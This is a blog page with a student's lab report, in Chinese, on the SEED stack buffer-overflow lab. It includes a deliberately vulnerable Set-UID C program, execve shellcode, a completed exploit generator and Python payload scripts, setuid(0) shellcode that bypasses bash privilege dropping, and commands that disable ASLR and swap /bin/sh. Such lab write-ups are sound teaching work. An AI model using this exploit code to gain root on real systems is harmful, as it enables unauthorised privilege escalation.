@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>信息安全之缓存区溢出漏洞 - amendgit`s blog</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="amendgit" />
+  <meta name="description" content="这是SEED项目中的第二个实验，缓存区溢出漏洞，这是我的实验报告。
+
+" />
+
+  <meta name="keywords" content="amendgit, blog" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.48" />
+
+
+<link rel="canonical" href="http://localhost:1313/post/security/buffer-overflow/" />
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+<link href="/dist/even.min.css?v=3.2.0" rel="stylesheet">
+<link href="/lib/fancybox/jquery.fancybox-3.1.20.min.css" rel="stylesheet">
+
+
+
+
+<meta property="og:title" content="信息安全之缓存区溢出漏洞" />
+<meta property="og:description" content="这是SEED项目中的第二个实验，缓存区溢出漏洞，这是我的实验报告。
+
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/post/security/buffer-overflow/" /><meta property="article:published_time" content="2018-09-16T22:12:27&#43;08:00"/>
+<meta property="article:modified_time" content="2018-09-16T22:12:27&#43;08:00"/>
+<meta itemprop="name" content="信息安全之缓存区溢出漏洞">
+<meta itemprop="description" content="这是SEED项目中的第二个实验，缓存区溢出漏洞，这是我的实验报告。
+
+">
+
+
+<meta itemprop="datePublished" content="2018-09-16T22:12:27&#43;08:00" />
+<meta itemprop="dateModified" content="2018-09-16T22:12:27&#43;08:00" />
+<meta itemprop="wordCount" content="4850">
+
+
+
+<meta itemprop="keywords" content="security," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="信息安全之缓存区溢出漏洞"/>
+<meta name="twitter:description" content="这是SEED项目中的第二个实验，缓存区溢出漏洞，这是我的实验报告。
+
+"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">amendgit&#39;s blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">amendgit&#39;s blog</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">信息安全之缓存区溢出漏洞</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2018-09-16 </span>
+        
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#实验目的">实验目的</a></li>
+<li><a href="#实验内容">实验内容</a></li>
+<li><a href="#实验步骤">实验步骤</a>
+<ul>
+<li><a href="#3-1-初始设置">3.1 初始设置</a></li>
+<li><a href="#3-2-shellcode">3.2 Shellcode</a></li>
+<li><a href="#3-3-有漏洞的程序">3.3 有漏洞的程序</a></li>
+<li><a href="#3-4-任务1-攻击漏洞">3.4 任务1：攻击漏洞</a></li>
+<li><a href="#3-5-任务2-bin-bash中的保护">3.5 任务2：/bin/bash中的保护</a></li>
+<li><a href="#3-6-任务3-地址随机化">3.6 任务3 ：地址随机化</a></li>
+<li><a href="#3-7-关闭gcc编译器的栈保护机制">3.7 关闭GCC编译器的栈保护机制</a></li>
+</ul></li>
+<li><a href="#实验总结">实验总结</a></li>
+</ul></li>
+</ul>
+</nav>
+  </div>
+</div>
+
+    
+    
+
+    
+    <div class="post-content">
+      <p>这是SEED项目中的第二个实验，缓存区溢出漏洞，这是我的实验报告。</p>
+
+<p></p>
+
+<h2 id="实验目的">实验目的</h2>
+
+<p>本次实验的目的是让学生获得关于缓冲区溢出漏洞实际动手的能力，把所学到的关于此类漏洞的知识转化为行动。缓冲区溢出是指在一个程序试图超出预分配的固定长度的缓冲区写入数据的条件。恶意用户可以利用此漏洞的程序改变执行流程，甚至执行任意的代码。此漏洞由存储的数据（例如，缓冲区）和存储的控制（例如，返回地址）共同引起的：一个溢出的数据部分中，可能会影响该程序的控制流程的混合而产生的。因为可以改变程序返回地址溢出。</p>
+
+<h2 id="实验内容">实验内容</h2>
+
+<p>在本实验中，将给定学生一个有缓冲区溢出漏洞的程序。学生利用该漏洞，并最终获得root权限。另外，将引导学生了解已在Fedora中实现的多种保护方案对缓冲区溢出攻击防御。学生需要回答该方案是否有效，并解释为什么。</p>
+
+<h2 id="实验步骤">实验步骤</h2>
+
+<h3 id="3-1-初始设置">3.1 初始设置</h3>
+
+<p>实验指导手册上实验环境是Fedora Linux。我们使用的是预先配置好的Ubuntu 9.04 LTS版本。二者区别不大：Ubuntu不需要关闭不可执行栈保护，而Fedora是需要的。
+Fedroa里有三种机制使得缓冲区溢出攻击变得困难。在Ubuntu中有两种保护机制。我们需要先关闭掉这些保护。</p>
+
+<p><strong>关闭地址随机机制和执行屏蔽：</strong></p>
+
+<p>首先，Fedroa使用执行屏蔽使得堆栈不被执行，因此，即使我们能够在堆栈里插入一个shellcode，它也不能运行。第二，Fedra和Ubuntu使用地址空间随机机制使得开始地址的堆和栈随机，这使得猜测确切地址有了难度，而猜测地址是缓冲区溢出攻击的一个重要步骤。为了教学的目的，本实验中，我们使用下面的命令禁用了这些功能：</p>
+
+<pre><code class="language-shell">$ su root
+Password: (enter root password)
+# sysctl -w kernel.randomize_va_space=0
+# sysctl -w kernel.exec-sheild=0
+</code></pre>
+
+<p>执行结果如图1。我们的环境是Ubuntu，在Ubuntu中默认是没有执行屏蔽的。所以，我们的执行屏蔽失败了。会出现提示“error: “kernel.exec-shield” is an unknown key”。</p>
+
+<p><img src="/security/buffer-overflow/disable_randomize_va_space.png" alt="图1 关闭地址随机化" /></p>
+
+<p><strong>使用zsh代替bash：</strong></p>
+
+<p>此外，为了进一步防范缓冲区溢出攻击及其它利用shell程序的攻击，许多shell程序在被调用时自动放弃它们的特权。因此，即使你能欺骗一个Set-UID程序调用一个shell，也不能在这个shell中保持权限。这个防护措施在/bin/bash中实现。在Ubuntu中，/bin/sh实际是指向/bin/bash的一个符号链接。为了重现这一防护措施实现之前的情形，我们使用另一个shell程序zsh代替/bin/bash。下面的指令描述了如何设置zsh程序：</p>
+
+<pre><code class="language-shell"># cd /bin
+# rm sh
+# ln -s /bin/zsh /bin/sh
+</code></pre>
+
+<p>执行结果如图2：</p>
+
+<p><img src="/security/buffer-overflow/using_zsh_over_bash.png" alt="图2 使用符号链接使得sh链接到zsh" /></p>
+
+<p>到这里，本次实验环境就配置好了。</p>
+
+<h3 id="3-2-shellcode">3.2 Shellcode</h3>
+
+<p>在开始攻击之前，我们需要一个Shellcode，Shellcode是登陆到shell的一段代码。它必须被载入内存，那样我们才能强迫程序跳转到它。考虑以下程序：</p>
+
+<pre><code class="language-cpp">#include &lt;stdio.h&gt;
+
+int main( ) 
+{
+   char *name[2];
+
+   name[0] = &quot;/bin/sh&quot;;
+   name[1] = 0;
+   execve(name[0], name, 0);
+}
+</code></pre>
+
+<p>我们使用的shellcode是上述程序的汇编版。下面的程序显示了如何通过利用shell code任意重写一个缓冲区登录shell，请编译运行一下代码，看shell是否被调用。</p>
+
+<pre><code class="language-cpp">/* call_shellcode.c  */
+
+/*A program that creates a file containing code for launching shell*/
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+
+const char code[] =
+  &quot;\x31\xc0&quot;         /* Line 1:  xorl    %eax,%eax              */
+  &quot;\x50&quot;             /* Line 2:  pushl   %eax                   */
+  &quot;\x68&quot;&quot;//sh&quot;       /* Line 3:  pushl   $0x68732f2f            */
+  &quot;\x68&quot;&quot;/bin&quot;       /* Line 4:  pushl   $0x6e69622f            */
+  &quot;\x89\xe3&quot;         /* Line 5:  movl    %esp,%ebx              */
+  &quot;\x50&quot;             /* Line 6:  pushl   %eax                   */
+  &quot;\x53&quot;             /* Line 7:  pushl   %ebx                   */
+  &quot;\x89\xe1&quot;         /* Line 8:  movl    %esp,%ecx              */
+  &quot;\x99&quot;             /* Line 9:  cdql                           */
+  &quot;\xb0\x0b&quot;         /* Line 10: movb    $0x0b,%al              */
+  &quot;\xcd\x80&quot;         /* Line 11: int     $0x80                  */
+;
+
+int main(int argc, char **argv)
+{
+   char buf[sizeof(code)];
+   strcpy(buf, code);
+   ((void(*)())buf)();
+} 
+</code></pre>
+
+<p><img src="/security/buffer-overflow/call_shellcode_c.png" alt="图3 编译运行call_shellcode.c" /></p>
+
+<p>在运行之前调用<code>ps -A || grep pid</code>命令可以看到，我们运行的是bash。在运行call_shellcode之后，<code>ps -A || grep pid</code>命令看出当前运行的shell变成了zsh了。</p>
+
+<p>上面的代码使用字符数组将一段二进制程序存储到栈里。然后使用强制类型转换，告诉系统这段代码是一个函数调用。让操作系统去调用。因为关闭了执行屏蔽，所以系统会忠实的执行命令。</p>
+
+<p>这段shellcode的一些地方值得注意。首先，第三行将“//sh”而不是“/sh”推入栈，这是因为我们在这里需要一个32位的数字，而“/sh”只有24位。幸运的是，“//”和“/”等价，所以我们使用“//”对程序也没什么影响，而且起到补位作用。第二，在调用execve() 之前，我们需要分别存储name[0]（串地址），name（列地址）和NULL至%ebx、%ecx和%edx寄存器。第5 行将name[0]存储到%ebx；第8行将name存储到%ecx；第9行将%edx设为0；还有其它方法可以设%edx为0（如xorl %edx, %edx）。这里用的(cdql)指令只是较为简短。第三，当我们将%al设为11时调用了system call execve()，并执行了“int $0x80”。</p>
+
+<h3 id="3-3-有漏洞的程序">3.3 有漏洞的程序</h3>
+
+<p>下面是一个有漏洞的程序。编译下面的程序，并且在root下把它设置为Set-UID程序。</p>
+
+<pre><code class="language-cpp">/* stack.c */
+
+/* This program has a buffer overflow vulnerability. */
+/* Our task is to exploit this vulnerability */
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int bof(char *str)
+{
+    char buffer[12];
+
+    /* The following statement has a buffer overflow problem */ 
+    strcpy(buffer, str);
+
+    return 1;
+}
+
+int main(int argc, char **argv)
+{
+    char str[517];
+    FILE *badfile;
+
+    badfile = fopen(&quot;badfile&quot;, &quot;r&quot;);
+    fread(str, sizeof(char), 517, badfile);
+    bof(str);
+    printf(&quot;Returned Properly\n&quot;);
+    return 1;
+}
+</code></pre>
+
+<p><img src="/security/buffer-overflow/compile_stack_c_and_set_uid.png" alt="图4 编译stack.c并设置Set-UID" /></p>
+
+<p>上面的程序中有一个缓冲区溢出漏洞。它首先从文件“BADFILE”读取输入。然后在bof()函数中，将字符数组拷贝到另一个缓冲区中。输入可最大长度可以为517个字节，但bof()函数中的的缓冲区只有12字节。由于strcpy()函数不检查边界，会发生缓冲区溢出。由于这个程序是Set-UID程序，如果一个普通用户可以利用这个缓冲区溢出漏洞，普通的用户可能会得到一个root shell。该程序的输入是文件“BADFILE”，这个文件是由普通用户控制的。现在，我们的目标是构造“BADFILE”的内容。这样当有漏洞的程序的内容复制到缓冲区中，可以产生一个root shell。</p>
+
+<h3 id="3-4-任务1-攻击漏洞">3.4 任务1：攻击漏洞</h3>
+
+<p>实验指导提供了一段部分完成的攻击代码“exploit.c”，这段代码的目的是为 “badfile” 创建内容。代码中，shell code已经给出，我们需要完成其余部分。</p>
+
+<pre><code class="language-cpp">/* exploit.c  */
+
+/* A program that creates a file containing code for launching shell*/
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+char shellcode[]=
+    &quot;\x31\xc0&quot;             /* xorl    %eax,%eax              */
+    &quot;\x50&quot;                 /* pushl   %eax                   */
+    &quot;\x68&quot;&quot;//sh&quot;           /* pushl   $0x68732f2f            */
+    &quot;\x68&quot;&quot;/bin&quot;           /* pushl   $0x6e69622f            */
+    &quot;\x89\xe3&quot;             /* movl    %esp,%ebx              */
+    &quot;\x50&quot;                 /* pushl   %eax                   */
+    &quot;\x53&quot;                 /* pushl   %ebx                   */
+    &quot;\x89\xe1&quot;             /* movl    %esp,%ecx              */
+    &quot;\x99&quot;                 /* cdql                           */
+    &quot;\xb0\x0b&quot;             /* movb    $0x0b,%al              */
+    &quot;\xcd\x80&quot;             /* int     $0x80                  */
+;
+
+void main(int argc, char **argv)
+{
+    char buffer[517];
+    FILE *badfile;
+
+    /* Initialize buffer with 0x90 (NOP instruction) */
+    memset(&amp;buffer, 0x90, 517);
+
+    /* You need to fill the buffer with appropriate contents here */ 
+
+    /* Save the contents to the file &quot;badfile&quot; */
+    badfile = fopen(&quot;./badfile&quot;, &quot;w&quot;);
+    fwrite(buffer, 517, 1, badfile);
+    fclose(badfile);
+}
+</code></pre>
+
+<p>完成以上程序后编译并运行，它将为“badfile”生成内容。然后运行漏洞程序栈，如果你的攻击正确实现，你将得到一个root shell。</p>
+
+<p>原理：stack中的bof函数执行strcpy(buffer,str)，将字符串<code>\x90\x90\x90......\addr1\addr2\addr3\addr4\</code>放入buffer中，由于buffer只有12字节，溢出后<code>\addr1\addr2\addr3\addr4\</code>覆盖了返回地址，当bof执行完后返回到str的str[100]处，执行shellcode。所以在str[0]开始处放入字符串：</p>
+
+<pre><code>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\addr1\addr2\addr3\addr4\0
+</code></pre>
+
+<p>在str[100]开始处放入shellcode。addr[1]是str[100]地址的低字节，address[2]是str[100]地址的次低字节，依次类推。然后将恶意代码写入到str中，ret刚好指向恶意的shellcode，并且执行。</p>
+
+<p>执行命令 objdump -d stack找到字符数组的首地址。</p>
+
+<p>反汇编后，<code>0x080484a1 &lt;main+14&gt;: sub    $0x224,%esp</code> 这句是为str分配空间的。在他的下一句处设置断点。</p>
+
+<p><img src="/security/buffer-overflow/find_the_start_of_string.png" alt="图7 查找字符串的首地址" /></p>
+
+<p>设置断点<code>b *0x080484a7</code>，然后运行程序，在断点处查看esp中的内容。就是str的首地址。</p>
+
+<p><img src="/security/buffer-overflow/find_the_start_of_string_2.png" alt="图8 查找字符串的首地址" /></p>
+
+<p>找到首地址，为0xbffff300，加上一百是0xbffff364。就得到str[100]的地址了。我们将shellcode写入到100更高的地址。这样程序执行是会从100开始执行NOP然后一直到shellcode，执行shellcode。</p>
+
+<pre><code class="language-cpp">/* exploit.c  */
+
+/* A program that creates a file containing code for launching shell*/
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+char shellcode[]=
+    &quot;\x31\xc0&quot;             /* xorl    %eax,%eax              */
+    &quot;\x50&quot;                 /* pushl   %eax                   */
+    &quot;\x68&quot;&quot;//sh&quot;           /* pushl   $0x68732f2f            */
+    &quot;\x68&quot;&quot;/bin&quot;           /* pushl   $0x6e69622f            */
+    &quot;\x89\xe3&quot;             /* movl    %esp,%ebx              */
+    &quot;\x50&quot;                 /* pushl   %eax                   */
+    &quot;\x53&quot;                 /* pushl   %ebx                   */
+    &quot;\x89\xe1&quot;             /* movl    %esp,%ecx              */
+    &quot;\x99&quot;                 /* cdql                           */
+    &quot;\xb0\x0b&quot;             /* movb    $0x0b,%al              */
+    &quot;\xcd\x80&quot;             /* int     $0x80                  */
+;
+
+void main(int argc, char **argv)
+{
+    char buffer[517];
+    FILE *badfile;
+    char *p = NULL;
+    int i = 0;
+
+    /* Initialize buffer with 0x90 (NOP instruction) */
+    memset(&amp;buffer, 0x90, 517);
+
+    /* You need to fill the buffer with appropriate contents here */ 
+    memcpy(buffer+16, &quot;\x64\xf3\xff\xbf&quot;, 4);
+    memcpy(buffer+120, shellcode, strlen(shellcode));
+    
+    /* Save the contents to the file &quot;badfile&quot; */
+    badfile = fopen(&quot;./badfile&quot;, &quot;w&quot;);
+    fwrite(buffer, 517, 1, badfile);
+    fclose(badfile);
+}
+</code></pre>
+
+<p><img src="/security/buffer-overflow/exploit_stack_success.png" alt="图9 攻击stack成功" /></p>
+
+<p>在实验中做这一步的时候，遇到了一个问题：buffer首地址和ret地址理论上是相聚16个字节，但是在实际中发现二者不是仅仅挨着的。比如有时候会相距24字节，所以我用python写了个脚本，进行攻击尝试。脚本和exploit.c唯一的好处在于，每次修改之后不需要重新编译，直接就能运行。脚本代码如下：</p>
+
+<pre><code class="language-python">#!user/bin/env python
+#-*- coding:utf-8 -*-
+import subprocess
+
+shell_code = ( 
+    &quot;\x31\xc0&quot;,   # xorl    %eax,%eax
+    &quot;\x50&quot;,       # pushl   %eax                  
+    &quot;\x68&quot;&quot;//sh&quot;, # pushl   $0x68732f2f            
+    &quot;\x68&quot;&quot;/bin&quot;, # pushl   $0x6e69622f            
+    &quot;\x89\xe3&quot;,   # movl    %esp,%ebx              
+    &quot;\x50&quot;,       # pushl   %eax                   
+    &quot;\x53&quot;,       # pushl   %ebx                   
+    &quot;\x89\xe1&quot;,   # movl    %esp,%ecx              
+    &quot;\x99&quot;,       # cdql                           
+    &quot;\xb0\x0b&quot;,   # movb    $0x0b,%al              
+    &quot;\xcd\x80&quot;)   # int     $0x80                  
+
+def exploit(pos):
+    # open the badfile
+    fd = open('badfile', 'wb')
+    size = 0
+    # overflow buffer to ret
+    fd.write(pos * '\x90')
+    size += pos
+    # modify the return address
+    ret_addr = '\x64\xf3\xff\xbf'
+    fd.write(ret_addr)
+    size += len(ret_addr)
+    # padding to the 480 postion
+    fd.write('\x90' * (120 - size))
+    size = 120
+    # write the shell code to stack
+    for s in shell_code:
+        fd.write(s)
+        size += len(s)
+    # padding to 517 bytes
+    fd.write('\x90' * (517 - size))
+    # OK
+    fd.close();
+
+if __name__ == '__main__':
+    exploit(16)
+</code></pre>
+
+<p>等到尝试出来buffer和ret地址之间的距离时，再用exploit.c进行攻击。</p>
+
+<h3 id="3-5-任务2-bin-bash中的保护">3.5 任务2：/bin/bash中的保护</h3>
+
+<p>现在，我们让/bin/sh 指回到/bin/bash ，然后进行和之前任务中同样的攻击。还能得到shell吗？这个shell 是root shell 吗？发生了什么？在实验报告中描述你观察到的现象并解释。</p>
+
+<p><img src="/security/buffer-overflow/using_bash_as_shell.png" alt="图10 修改sh链接到bash" /></p>
+
+<p>攻击发现虽然可以得到shell，但是这个shell已经不是rootshell了：</p>
+
+<p><img src="/security/buffer-overflow/expolit_bash_failed.png" alt="图10 对bash攻击失败" /></p>
+
+<p>下面的汇编代码是调用setuid的汇编代码，setuid的系统调用号是17，编写汇编代码如下：</p>
+
+<pre><code class="language-nasm"> .text
+    .globl main
+main:
+    xorl    %eax,%eax
+    movb    $0xD5,%al
+    xorl    %ebx,%ebx
+    int     $0x80
+    leave
+    ret
+</code></pre>
+
+<p>使用命令 gcc -c exploit2.s 编译，然后使用objdump -d exploit2.o查看编译后的结果：</p>
+
+<pre><code class="language-nasm">Disassembly of section .text:
+
+00000000 &lt;main&gt;:
+   0:	31 c0                	xor    %eax,%eax
+   2:	b0 d5                	mov    $0xd5,%al
+   4:	31 db                	xor    %ebx,%ebx
+   6:	cd 80                	int    $0x80
+   8:	c9                   	leave  
+   9:	c3                   	ret    
+</code></pre>
+
+<p>将其签名的四句拷贝到攻击代码的汇编代码的签名，得到下面的代码：</p>
+
+<pre><code class="language-python">#!user/bin/env python
+#-*- coding:utf-8 -*-
+
+import subprocess
+
+shell_code = ( 
+    &quot;\x31\xc0&quot;,   # xor    %eax,%eax
+    &quot;\xb0\xd5&quot;,   # mov    $0xd5,%al
+    &quot;\x31\xdb&quot;,   # xor    %ebx,%ebx
+    &quot;\xcd\x80&quot;,   # int    $0x80
+    &quot;\x31\xc0&quot;,   # xorl    %eax,%eax
+    &quot;\x50&quot;,       # pushl   %eax                  
+    &quot;\x68&quot;&quot;//sh&quot;, # pushl   $0x68732f2f            
+    &quot;\x68&quot;&quot;/bin&quot;, # pushl   $0x6e69622f            
+    &quot;\x89\xe3&quot;,   # movl    %esp,%ebx              
+    &quot;\x50&quot;,       # pushl   %eax                   
+    &quot;\x53&quot;,       # pushl   %ebx                   
+    &quot;\x89\xe1&quot;,   # movl    %esp,%ecx              
+    &quot;\x99&quot;,       # cdql                           
+    &quot;\xb0\x0b&quot;,   # movb    $0x0b,%al              
+    &quot;\xcd\x80&quot;,)  # int     $0x80      
+
+def exploit(pos):
+    # open the badfile
+    fd = open('badfile', 'wb')
+    size = 0
+    # overflow buffer to ret
+    fd.write(pos * '\x90')
+    size += pos
+    # modify the return address
+    ret_addr = '\x64\xf3\xff\xbf'
+    fd.write(ret_addr)
+    size += len(ret_addr)
+    # padding to the 480 postion
+    fd.write('\x90' * (120 - size))
+    size = 120
+    # write the shell code to stack
+    for s in shell_code:
+        fd.write(s)
+        size += len(s)
+    # padding to 517 bytes
+    fd.write('\x90' * (517 - size))
+    # OK
+    fd.close();
+
+if __name__ == '__main__':
+    exploit(16)
+</code></pre>
+
+<p>现在进行攻击，发现攻击成功：</p>
+
+<p><img src="/security/buffer-overflow/using_bash_as_shell.png" alt="图11 攻击成功" /></p>
+
+<h3 id="3-6-任务3-地址随机化">3.6 任务3 ：地址随机化</h3>
+
+<p>打开地址空间随机化保护。发现攻击不能生效了，可以使用shell脚本进行攻击：</p>
+
+<p><img src="/security/buffer-overflow/randomize_space.png" alt="图12 地址随机化关闭攻击失败" /></p>
+
+<p>可以看到攻击在重复多次以后成功了。</p>
+
+<h3 id="3-7-关闭gcc编译器的栈保护机制">3.7 关闭GCC编译器的栈保护机制</h3>
+
+<p>目前为止我们都是关闭了GCC的栈保护机制，如果我们打开了GCC的栈保护机制，即在编译时不使用–fno-stack-protector,那么重复上面的攻击，我们会发现攻击失败。会提示检测出栈践踏攻击。</p>
+
+<p><img src="/security/buffer-overflow/stack_protect.png" alt="图13 栈保护机制" /></p>
+
+<h2 id="实验总结">实验总结</h2>
+
+<p><strong>问题：</strong></p>
+
+<p>在任务1中构造exploit构造badfile攻击stack程序时，发现覆盖返回地址时总是不对。导致无法攻击成功。经过gdb调试时，发现返回地址填充的是0x90909090，跟预期的不对。后来经过反复修改覆盖返回地址的位置，从<code>16 -&gt; 20 -&gt; 24</code>时成功了。理论上，buffer首地址与返回地址是相差16个字节的，这样的结果的话，应该可以解释为gcc在编译的时候在返回地址和局部变量之间还保留了一部分内存空间。
+在任务5中，需要构造一个系统调用setuid，但是对汇编不是非常了解。不知道setuid的系统调用号，写了一个简单的setuid程序，然后用IDA调试跟踪，查到调用号为17。</p>
+
+<p><strong>总结：</strong></p>
+
+<p>栈溢出攻击的理论是上课是华保健老师仔细讲结果的。本来以为理论上已经弄懂了，结果在做实验时发现遇到各种奇怪的错误。理论加上动手才能更加深刻将所学习的东西进行掌握。同时，也发现自己的不足之处，做为一个信息安全专业的学生却对汇编不是很了解。因此打算找一本汇编的书通读一下，不求精通，但至少看到汇编代码不会觉得一头雾水。本次实验收获很多，大部分都是细枝末节上的东西，在犯错纠错的过程中一点一点的弄懂很多东西。觉得时间花的还是值得的。本来是想写一个python脚本可以自动的构造攻击文件进行测试攻击是否成功，结果发现环境里的python版本太低，自己懂的又太少，所以没有成功。不过，用脚本进行攻击比编译-运行的过程快很多，觉得还是很值得这么做的。</p>
+    </div>
+
+    
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">amendgit</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">2018-09-16</span>
+  </p>
+  
+  
+</div>
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          
+          <a href="/tags/security/">security</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/leetcode/leetcode-solutions-121-140/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">Leetcode Solutions 121 140</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        
+          <a class="next" href="/post/leetcode/leetcode-solutions-161-180/">
+            <span class="next-text nav-default">Leetcode Solutions 161 180</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:shijian0912@163.com" class="iconfont icon-email" title="email"></a>
+      <a href="http://localhost:1313" class="iconfont icon-stack-overflow" title="stack-overflow"></a>
+      <a href="http://localhost:1313" class="iconfont icon-twitter" title="twitter"></a>
+      <a href="http://localhost:1313" class="iconfont icon-facebook" title="facebook"></a>
+      <a href="http://localhost:1313" class="iconfont icon-linkedin" title="linkedin"></a>
+      <a href="http://localhost:1313" class="iconfont icon-google" title="google"></a>
+      <a href="http://localhost:1313" class="iconfont icon-github" title="github"></a>
+      <a href="http://localhost:1313" class="iconfont icon-weibo" title="weibo"></a>
+      <a href="http://localhost:1313" class="iconfont icon-zhihu" title="zhihu"></a>
+      <a href="http://localhost:1313" class="iconfont icon-douban" title="douban"></a>
+      <a href="http://localhost:1313" class="iconfont icon-pocket" title="pocket"></a>
+      <a href="http://localhost:1313" class="iconfont icon-tumblr" title="tumblr"></a>
+      <a href="http://localhost:1313" class="iconfont icon-instagram" title="instagram"></a>
+  <a href="http://localhost:1313/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    
+      2017 - 
+    2018
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">amendgit</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+<script src="/lib/highlight/highlight.pack.js?v=20171001"></script><script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox-3.1.20.min.js"></script>
+
+
+<script type="text/javascript" src="/dist/even.min.js?v=3.2.0"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
